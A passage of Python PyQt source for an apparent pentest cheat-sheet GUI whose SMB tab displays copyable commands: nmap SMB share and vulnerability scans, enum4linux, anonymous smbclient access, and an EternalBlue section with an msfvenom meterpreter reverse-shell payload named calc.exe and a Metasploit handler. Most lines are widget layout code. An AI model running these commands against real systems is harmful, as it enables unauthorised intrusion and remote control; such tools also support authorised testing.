        self.msfv_web_badchar_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_web_badchar_spacer1
        if hasattr(self, 'msfv_web_badchar_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_spacer1)
            self.msfv_web_badchar_spacer1.deleteLater()
        self.msfv_web_badchar_spacer1 = QLabel()
        self.msfv_web_badchar_spacer1.setFixedWidth(40)
        self.msfv_web_badchar_spacer1.setFixedHeight(50)
     
        # msfv_web_badchar_spacer2
        if hasattr(self, 'msfv_web_badchar_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_web_badchar_spacer2)
            self.msfv_web_badchar_spacer2.deleteLater()
        self.msfv_web_badchar_spacer2 = QLabel()
        self.msfv_web_badchar_spacer2.setFixedWidth(40)
        self.msfv_web_badchar_spacer2.setFixedHeight(50)
     
        # msfv_web_badchar spacer & divider layout
        self.tab7_container_layout.insertWidget(200, self.msfv_web_badchar_spacer1)
        self.tab7_container_layout.insertWidget(201, self.msfv_web_badchar_divider1)
        self.tab7_container_layout.insertWidget(202, self.msfv_web_badchar_divider2)
        self.tab7_container_layout.insertWidget(203, self.msfv_web_badchar_spacer2)
        self.tab7_container_layout.addStretch()

#### SMBHelper
    def smbhelper(self):
        if not hasattr(self, 'tab8_container'):
            self.tab8_container = QWidget()
            self.tab8_container_layout = QVBoxLayout(self.tab8_container)
            self.tab8_container.setLayout(self.tab8_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab8_container)
            self.scroll.setWidgetResizable(True)
            self.tab8_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab8_container_layout.setContentsMargins(0,0,0,0)
            self.tab8_container.adjustSize()
            self.tab8.setLayout(QVBoxLayout())
            self.tab8.layout().addWidget(self.scroll)

    # smbhelper_top_spacer1
        if hasattr(self, 'smbhelper_top_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_top_spacer1)
            self.smbhelper_top_spacer1.deleteLater()
        self.smbhelper_top_spacer1 = QLabel()
        self.smbhelper_top_spacer1.setFixedWidth(40)
        self.smbhelper_top_spacer1.setFixedHeight(50)
     
        # smbhelper_top_spacer_layout
        self.tab8_container_layout.insertWidget(0, self.smbhelper_top_spacer1)
        self.tab8_container_layout.addStretch()

    # smbhelper_nmap
        if hasattr(self, 'smbhelper_nmap'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap)
            self.smbhelper_nmap.deleteLater()
        self.smbhelper_nmap = QLabel("[ + Enumeration NMAP ]")
        self.smbhelper_nmap.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(1,self.smbhelper_nmap)
     
        # smbhelper_nmap_Scan1
        if hasattr(self, 'smbhelper_nmap_Scan1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan1)
            self.smbhelper_nmap_Scan1.deleteLater()
        self.smbhelper_nmap_Scan1 = QLabel("nmap -p" + self.rport + " --script=smb-enum-shares " + self.rhost + "")
        self.smbhelper_nmap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(2,self.smbhelper_nmap_Scan1)
     
        # smbhelper_nmap_Scan1_Copy
        if hasattr(self, 'smbhelper_nmap_Scan1_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan1_Copy)
            self.smbhelper_nmap_Scan1_Copy.deleteLater()
        self.smbhelper_nmap_Scan1_Copy = QPushButton()
        self.smbhelper_nmap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_nmap_Scan1_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_nmap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_nmap_Scan1.text()))
        self.smbhelper_nmap_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_nmap_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_nmap_Scan1_Copy)
        label_layout.addWidget(self.smbhelper_nmap_Scan1)
        self.tab8_container_layout.insertLayout(3, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_nmap_divider1
        if hasattr(self, 'smbhelper_nmap_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider1)
            self.smbhelper_nmap_divider1.deleteLater()
        self.smbhelper_nmap_divider1 = QFrame()
        self.smbhelper_nmap_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_nmap_divider1.setLineWidth(3)
        self.smbhelper_nmap_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_nmap_divider2
        if hasattr(self, 'smbhelper_nmap_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider2)
            self.smbhelper_nmap_divider2.deleteLater()
        self.smbhelper_nmap_divider2 = QFrame()
        self.smbhelper_nmap_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_nmap_divider2.setLineWidth(3)
        self.smbhelper_nmap_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_nmap_spacer1
        if hasattr(self, 'smbhelper_nmap_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer1)
            self.smbhelper_nmap_spacer1.deleteLater()
        self.smbhelper_nmap_spacer1 = QLabel()
        self.smbhelper_nmap_spacer1.setFixedWidth(40)
        self.smbhelper_nmap_spacer1.setFixedHeight(50)
     
        # smbhelper_nmap_spacer2
        if hasattr(self, 'smbhelper_nmap_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer2)
            self.smbhelper_nmap_spacer2.deleteLater()
        self.smbhelper_nmap_spacer2 = QLabel()
        self.smbhelper_nmap_spacer2.setFixedWidth(40)
        self.smbhelper_nmap_spacer2.setFixedHeight(50)
     
        # smbhelper_nmap spacer & divider layout
        self.tab8_container_layout.insertWidget(4, self.smbhelper_nmap_spacer1)
        self.tab8_container_layout.insertWidget(5, self.smbhelper_nmap_divider1)
        self.tab8_container_layout.insertWidget(6, self.smbhelper_nmap_divider2)
        self.tab8_container_layout.insertWidget(7, self.smbhelper_nmap_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_nmap_Scan2
        if hasattr(self, 'smbhelper_nmap_Scan2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan2)
            self.smbhelper_nmap_Scan2.deleteLater()
        self.smbhelper_nmap_Scan2 = QLabel("nmap -p" + self.rport + " -Pn --script=smb-vuln-*.nse " + self.rhost + "")
        self.smbhelper_nmap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(8,self.smbhelper_nmap_Scan2)
     
        # smbhelper_nmap_Scan2_Copy
        if hasattr(self, 'smbhelper_nmap_Scan2_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan2_Copy)
            self.smbhelper_nmap_Scan2_Copy.deleteLater()
        self.smbhelper_nmap_Scan2_Copy = QPushButton()
        self.smbhelper_nmap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_nmap_Scan2_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_nmap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_nmap_Scan2.text()))
        self.smbhelper_nmap_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_nmap_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_nmap_Scan2_Copy)
        label_layout.addWidget(self.smbhelper_nmap_Scan2)
        self.tab8_container_layout.insertLayout(9, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_nmap_divider1
        if hasattr(self, 'smbhelper_nmap_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider1)
            self.smbhelper_nmap_divider1.deleteLater()
        self.smbhelper_nmap_divider1 = QFrame()
        self.smbhelper_nmap_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_nmap_divider1.setLineWidth(3)
        self.smbhelper_nmap_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_nmap_divider2
        if hasattr(self, 'smbhelper_nmap_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider2)
            self.smbhelper_nmap_divider2.deleteLater()
        self.smbhelper_nmap_divider2 = QFrame()
        self.smbhelper_nmap_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_nmap_divider2.setLineWidth(3)
        self.smbhelper_nmap_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_nmap_spacer1
        if hasattr(self, 'smbhelper_nmap_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer1)
            self.smbhelper_nmap_spacer1.deleteLater()
        self.smbhelper_nmap_spacer1 = QLabel()
        self.smbhelper_nmap_spacer1.setFixedWidth(40)
        self.smbhelper_nmap_spacer1.setFixedHeight(50)
     
        # smbhelper_nmap_spacer2
        if hasattr(self, 'smbhelper_nmap_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer2)
            self.smbhelper_nmap_spacer2.deleteLater()
        self.smbhelper_nmap_spacer2 = QLabel()
        self.smbhelper_nmap_spacer2.setFixedWidth(40)
        self.smbhelper_nmap_spacer2.setFixedHeight(50)
     
        # smbhelper_nmap spacer & divider layout
        self.tab8_container_layout.insertWidget(10, self.smbhelper_nmap_spacer1)
        self.tab8_container_layout.insertWidget(11, self.smbhelper_nmap_divider1)
        self.tab8_container_layout.insertWidget(12, self.smbhelper_nmap_divider2)
        self.tab8_container_layout.insertWidget(13, self.smbhelper_nmap_spacer2)
        self.tab8_container_layout.addStretch()
     
    # smbhelper_enum4linux
        if hasattr(self, 'smbhelper_enum4linux'):
            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux)
            self.smbhelper_enum4linux.deleteLater()
        self.smbhelper_enum4linux = QLabel("[ + Enum4Linux ]")
        self.smbhelper_enum4linux.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(14,self.smbhelper_enum4linux)
     
        # smbhelper_enum4linux_Scan1
        if hasattr(self, 'smbhelper_enum4linux_Scan1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_Scan1)
            self.smbhelper_enum4linux_Scan1.deleteLater()
        self.smbhelper_enum4linux_Scan1 = QLabel("enum4linux -a " + self.rhost + "")
        self.smbhelper_enum4linux_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(15,self.smbhelper_enum4linux_Scan1)
     
        # smbhelper_enum4linux_Scan1_Copy
        if hasattr(self, 'smbhelper_enum4linux_Scan1_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_Scan1_Copy)
            self.smbhelper_enum4linux_Scan1_Copy.deleteLater()
        self.smbhelper_enum4linux_Scan1_Copy = QPushButton()
        self.smbhelper_enum4linux_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_enum4linux_Scan1_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_enum4linux_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_enum4linux_Scan1.text()))
        self.smbhelper_enum4linux_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_enum4linux_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_enum4linux_Scan1_Copy)
        label_layout.addWidget(self.smbhelper_enum4linux_Scan1)
        self.tab8_container_layout.insertLayout(16, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_enum4linux_divider1
        if hasattr(self, 'smbhelper_enum4linux_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_divider1)
            self.smbhelper_enum4linux_divider1.deleteLater()
        self.smbhelper_enum4linux_divider1 = QFrame()
        self.smbhelper_enum4linux_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_enum4linux_divider1.setLineWidth(3)
        self.smbhelper_enum4linux_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_enum4linux_divider2
        if hasattr(self, 'smbhelper_enum4linux_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_divider2)
            self.smbhelper_enum4linux_divider2.deleteLater()
        self.smbhelper_enum4linux_divider2 = QFrame()
        self.smbhelper_enum4linux_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_enum4linux_divider2.setLineWidth(3)
        self.smbhelper_enum4linux_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_enum4linux_spacer1
        if hasattr(self, 'smbhelper_enum4linux_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_spacer1)
            self.smbhelper_enum4linux_spacer1.deleteLater()
        self.smbhelper_enum4linux_spacer1 = QLabel()
        self.smbhelper_enum4linux_spacer1.setFixedWidth(40)
        self.smbhelper_enum4linux_spacer1.setFixedHeight(50)
     
        # smbhelper_enum4linux_spacer2
        if hasattr(self, 'smbhelper_enum4linux_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_spacer2)
            self.smbhelper_enum4linux_spacer2.deleteLater()
        self.smbhelper_enum4linux_spacer2 = QLabel()
        self.smbhelper_enum4linux_spacer2.setFixedWidth(40)
        self.smbhelper_enum4linux_spacer2.setFixedHeight(50)
     
        # smbhelper_enum4linux spacer & divider layout
        self.tab8_container_layout.insertWidget(17, self.smbhelper_enum4linux_spacer1)
        self.tab8_container_layout.insertWidget(18, self.smbhelper_enum4linux_divider1)
        self.tab8_container_layout.insertWidget(19, self.smbhelper_enum4linux_divider2)
        self.tab8_container_layout.insertWidget(20, self.smbhelper_enum4linux_spacer2)
        self.tab8_container_layout.addStretch()
     
    # smbhelper_SMBClient
        if hasattr(self, 'smbhelper_SMBClient'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient)
            self.smbhelper_SMBClient.deleteLater()
        self.smbhelper_SMBClient = QLabel("[ + SMBClient ]")
        self.smbhelper_SMBClient.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(21,self.smbhelper_SMBClient)
     
        # smbhelper_SMBClient_Scan1
        if hasattr(self, 'smbhelper_SMBClient_Scan1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan1)
            self.smbhelper_SMBClient_Scan1.deleteLater()
        self.smbhelper_SMBClient_Scan1 = QLabel("smbclient -L  -N  //" + self.rhost + "")
        self.smbhelper_SMBClient_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(22,self.smbhelper_SMBClient_Scan1)
     
        # smbhelper_SMBClient_Scan1_Copy
        if hasattr(self, 'smbhelper_SMBClient_Scan1_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan1_Copy)
            self.smbhelper_SMBClient_Scan1_Copy.deleteLater()
        self.smbhelper_SMBClient_Scan1_Copy = QPushButton()
        self.smbhelper_SMBClient_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_SMBClient_Scan1_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_SMBClient_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_SMBClient_Scan1.text()))
        self.smbhelper_SMBClient_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_SMBClient_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_SMBClient_Scan1_Copy)
        label_layout.addWidget(self.smbhelper_SMBClient_Scan1)
        self.tab8_container_layout.insertLayout(23, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_SMBClient_divider1
        if hasattr(self, 'smbhelper_SMBClient_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider1)
            self.smbhelper_SMBClient_divider1.deleteLater()
        self.smbhelper_SMBClient_divider1 = QFrame()
        self.smbhelper_SMBClient_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_SMBClient_divider1.setLineWidth(3)
        self.smbhelper_SMBClient_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_SMBClient_divider2
        if hasattr(self, 'smbhelper_SMBClient_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider2)
            self.smbhelper_SMBClient_divider2.deleteLater()
        self.smbhelper_SMBClient_divider2 = QFrame()
        self.smbhelper_SMBClient_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_SMBClient_divider2.setLineWidth(3)
        self.smbhelper_SMBClient_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_SMBClient_spacer1
        if hasattr(self, 'smbhelper_SMBClient_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer1)
            self.smbhelper_SMBClient_spacer1.deleteLater()
        self.smbhelper_SMBClient_spacer1 = QLabel()
        self.smbhelper_SMBClient_spacer1.setFixedWidth(40)
        self.smbhelper_SMBClient_spacer1.setFixedHeight(50)
     
        # smbhelper_SMBClient_spacer2
        if hasattr(self, 'smbhelper_SMBClient_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer2)
            self.smbhelper_SMBClient_spacer2.deleteLater()
        self.smbhelper_SMBClient_spacer2 = QLabel()
        self.smbhelper_SMBClient_spacer2.setFixedWidth(40)
        self.smbhelper_SMBClient_spacer2.setFixedHeight(50)
     
        # smbhelper_SMBClient spacer & divider layout
        self.tab8_container_layout.insertWidget(24, self.smbhelper_SMBClient_spacer1)
        self.tab8_container_layout.insertWidget(25, self.smbhelper_SMBClient_divider1)
        self.tab8_container_layout.insertWidget(26, self.smbhelper_SMBClient_divider2)
        self.tab8_container_layout.insertWidget(27, self.smbhelper_SMBClient_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_SMBClient_Scan2
        if hasattr(self, 'smbhelper_SMBClient_Scan2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan2)
            self.smbhelper_SMBClient_Scan2.deleteLater()
        self.smbhelper_SMBClient_Scan2 = QLabel("smbclient //" + self.rhost + "/share -N")
        self.smbhelper_SMBClient_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(28,self.smbhelper_SMBClient_Scan2)
     
        # smbhelper_SMBClient_Scan2_Copy
        if hasattr(self, 'smbhelper_SMBClient_Scan2_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan2_Copy)
            self.smbhelper_SMBClient_Scan2_Copy.deleteLater()
        self.smbhelper_SMBClient_Scan2_Copy = QPushButton()
        self.smbhelper_SMBClient_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_SMBClient_Scan2_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_SMBClient_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_SMBClient_Scan2.text()))
        self.smbhelper_SMBClient_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_SMBClient_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_SMBClient_Scan2_Copy)
        label_layout.addWidget(self.smbhelper_SMBClient_Scan2)
        self.tab8_container_layout.insertLayout(29, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_SMBClient_divider1
        if hasattr(self, 'smbhelper_SMBClient_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider1)
            self.smbhelper_SMBClient_divider1.deleteLater()
        self.smbhelper_SMBClient_divider1 = QFrame()
        self.smbhelper_SMBClient_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_SMBClient_divider1.setLineWidth(3)
        self.smbhelper_SMBClient_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_SMBClient_divider2
        if hasattr(self, 'smbhelper_SMBClient_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider2)
            self.smbhelper_SMBClient_divider2.deleteLater()
        self.smbhelper_SMBClient_divider2 = QFrame()
        self.smbhelper_SMBClient_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_SMBClient_divider2.setLineWidth(3)
        self.smbhelper_SMBClient_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_SMBClient_spacer1
        if hasattr(self, 'smbhelper_SMBClient_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer1)
            self.smbhelper_SMBClient_spacer1.deleteLater()
        self.smbhelper_SMBClient_spacer1 = QLabel()
        self.smbhelper_SMBClient_spacer1.setFixedWidth(40)
        self.smbhelper_SMBClient_spacer1.setFixedHeight(50)
     
        # smbhelper_SMBClient_spacer2
        if hasattr(self, 'smbhelper_SMBClient_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer2)
            self.smbhelper_SMBClient_spacer2.deleteLater()
        self.smbhelper_SMBClient_spacer2 = QLabel()
        self.smbhelper_SMBClient_spacer2.setFixedWidth(40)
        self.smbhelper_SMBClient_spacer2.setFixedHeight(50)
     
        # smbhelper_SMBClient spacer & divider layout
        self.tab8_container_layout.insertWidget(30, self.smbhelper_SMBClient_spacer1)
        self.tab8_container_layout.insertWidget(31, self.smbhelper_SMBClient_divider1)
        self.tab8_container_layout.insertWidget(32, self.smbhelper_SMBClient_divider2)
        self.tab8_container_layout.insertWidget(33, self.smbhelper_SMBClient_spacer2)
        self.tab8_container_layout.addStretch()
     
    # smbhelper_EternalBlue
        if hasattr(self, 'smbhelper_EternalBlue'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue)
            self.smbhelper_EternalBlue.deleteLater()
        self.smbhelper_EternalBlue = QLabel("[ + Eternalblue - Send Reverse Shell ]")
        self.smbhelper_EternalBlue.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(34,self.smbhelper_EternalBlue)
     
        # smbhelper_EternalBlue_Scan1
        if hasattr(self, 'smbhelper_EternalBlue_Scan1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan1)
            self.smbhelper_EternalBlue_Scan1.deleteLater()
        self.smbhelper_EternalBlue_Scan1 = QLabel("msfvenom -p windows/meterpreter/reverse_tcp -f exe-service lhost=" + self.lhost + " lport=" + self.lport + " -o calc.exe")
        self.smbhelper_EternalBlue_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(35,self.smbhelper_EternalBlue_Scan1)
     
        # smbhelper_EternalBlue_Scan1_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan1_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan1_Copy)
            self.smbhelper_EternalBlue_Scan1_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan1_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan1_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan1.text()))
        self.smbhelper_EternalBlue_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan1_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan1)
        self.tab8_container_layout.insertLayout(36, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
        # smbhelper_EternalBlue_spacer2
        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
            self.smbhelper_EternalBlue_spacer2.deleteLater()
        self.smbhelper_EternalBlue_spacer2 = QLabel()
        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
     
        # smbhelper_EternalBlue spacer & divider layout
        self.tab8_container_layout.insertWidget(37, self.smbhelper_EternalBlue_spacer1)
        self.tab8_container_layout.insertWidget(38, self.smbhelper_EternalBlue_divider1)
        self.tab8_container_layout.insertWidget(39, self.smbhelper_EternalBlue_divider2)
        self.tab8_container_layout.insertWidget(40, self.smbhelper_EternalBlue_spacer2)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_Scan2
        if hasattr(self, 'smbhelper_EternalBlue_Scan2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan2)
            self.smbhelper_EternalBlue_Scan2.deleteLater()
        self.smbhelper_EternalBlue_Scan2 = QLabel("sudo msfconsole -q -x i\"use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST " + self.lhost + ";set LPORT " + self.lport + ";exploit\"")
        self.smbhelper_EternalBlue_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab8_container_layout.insertWidget(41,self.smbhelper_EternalBlue_Scan2)
     
        # smbhelper_EternalBlue_Scan2_Copy
        if hasattr(self, 'smbhelper_EternalBlue_Scan2_Copy'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan2_Copy)
            self.smbhelper_EternalBlue_Scan2_Copy.deleteLater()
        self.smbhelper_EternalBlue_Scan2_Copy = QPushButton()
        self.smbhelper_EternalBlue_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.smbhelper_EternalBlue_Scan2_Copy.setFixedSize(QSize(20,20))
        self.smbhelper_EternalBlue_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan2.text()))
        self.smbhelper_EternalBlue_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # smbhelper_EternalBlue_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan2_Copy)
        label_layout.addWidget(self.smbhelper_EternalBlue_Scan2)
        self.tab8_container_layout.insertLayout(42, label_layout)
        self.tab8_container_layout.addStretch()
     
        # smbhelper_EternalBlue_divider1
        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
            self.smbhelper_EternalBlue_divider1.deleteLater()
        self.smbhelper_EternalBlue_divider1 = QFrame()
        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_divider2
        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
            self.smbhelper_EternalBlue_divider2.deleteLater()
        self.smbhelper_EternalBlue_divider2 = QFrame()
        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
     
        # smbhelper_EternalBlue_spacer1
        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
            self.smbhelper_EternalBlue_spacer1.deleteLater()
        self.smbhelper_EternalBlue_spacer1 = QLabel()
        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
     
